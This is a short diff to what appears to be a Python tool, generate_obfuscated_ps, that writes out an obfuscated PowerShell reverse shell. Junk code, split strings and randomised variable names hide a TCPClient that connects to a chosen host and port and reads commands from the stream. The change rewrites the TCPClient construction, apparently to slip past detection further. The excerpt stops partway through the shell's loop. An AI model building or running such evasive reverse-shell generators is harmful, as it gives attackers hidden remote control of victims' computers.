@@ -41,7 +41,7 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     # Fully explicit core shell: EVERY variable comes from var
     core_shell = (
         junk_code() +
-        f"${var['tcpclient']} = New-Object {split_string('System.Net.Sockets.TCPClient')} '{host}',{port}\n"
+        f"${var['tcpclient']} = New-Object ([type]({split_string('System.Net.Sockets.TCPClient')})) -ArgumentList '{host}',{port}\n"
         f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
         f"${var['bytes']} = 0..65535|%{{0}}\n"
         f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
